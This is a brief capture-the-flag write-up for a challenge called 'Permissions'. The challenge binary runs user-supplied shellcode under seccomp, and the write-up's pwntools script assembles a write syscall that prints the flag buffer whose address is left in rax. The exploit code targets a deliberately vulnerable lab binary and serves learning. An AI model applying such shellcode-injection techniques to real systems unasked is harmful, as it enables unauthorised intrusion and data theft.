# Permissions

The challenge sets up seccomp and allows read/write/exit, it then takes our input as shellcode and executes it.

The only problem is that we can not open the flag and the challenge closes the file descriptor it uses to read the flag. But, the address of where the flag is read to is still in `rax` (check in gdb) and we can simply print out the contents using a write syscall.

```python
from pwn import *
context.arch = "amd64"

# io = remote("amt.rs", 31174)
io = process("./chal")

payload = asm(f"""
	// write(1, flag_addr, 0x100)
	mov rdi, 1
	mov rsi, rax
	mov rdx, 0x100
	mov rax, 1
	syscall

    // exit(1)
	mov rdi, 1
	mov rax, 60
	syscall
""")

io.sendlineafter(b"> ", payload)

io.interactive()
```